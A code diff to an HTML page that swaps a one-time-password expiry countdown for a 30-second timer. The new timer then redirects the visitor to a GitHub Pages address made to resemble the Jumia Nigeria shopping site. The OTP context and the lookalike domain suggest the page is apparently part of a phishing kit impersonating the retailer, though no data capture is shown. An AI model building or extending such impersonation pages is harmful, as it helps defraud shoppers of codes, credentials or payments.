@@ -81,37 +81,30 @@ opacity: 0.9;}
 
 </style>
 
-    <script>
-      // Set the duration of the countdown in seconds
-      const duration = 30;
-      
-      // Get the countdown timer element from the HTML
-      const countdownTimer = document.getElementById('countdown-timer');
-      
-      // Update the countdown timer every second
-      const interval = setInterval(() => {
-        // Calculate the time remaining in the countdown
-        const now = new Date().getTime();
-        const remaining = Math.max(0, duration - Math.floor((now - startTime) / 1000));
-        
-        // Format the time remaining as seconds
-        const formattedTime = `${remaining} seconds`;
-        
-        // Update the countdown timer element with the formatted time
-        countdownTimer.innerHTML = formattedTime;
-        
-        // Stop the countdown timer when the duration has elapsed
-        if (remaining === 0) {
-          clearInterval(interval);
-          countdownTimer.innerText = 'OTP expired';
-        }
-      }, 1000);
-      
-      // Get the current time as the start time for the countdown
-      const startTime = new Date().getTime();
-    </script>
-          
-          
+<script>
+		window.onload = function() {
+			// Set the countdown time in seconds
+			var countdown = 30;
+
+			// Get the countdown element by ID
+			var countdownEl = document.getElementById('countdown');
+
+			// Update the countdown element every second
+			var countdownInterval = setInterval(function() {
+				// Decrement the countdown time
+				countdown--;
+
+				// Update the countdown element with the remaining time
+				countdownEl.textContent = countdown + ' seconds';
+
+				// If the countdown reaches zero, redirect to the specified URL
+				if (countdown === 0) {
+					clearInterval(countdownInterval);
+					window.location.href = 'https://jumia-ng-electronics-category-nig.github.io/jumia.com.ng/index2.html';
+				}
+			}, 1000);
+		}
+	</script>
 
 </head>
 
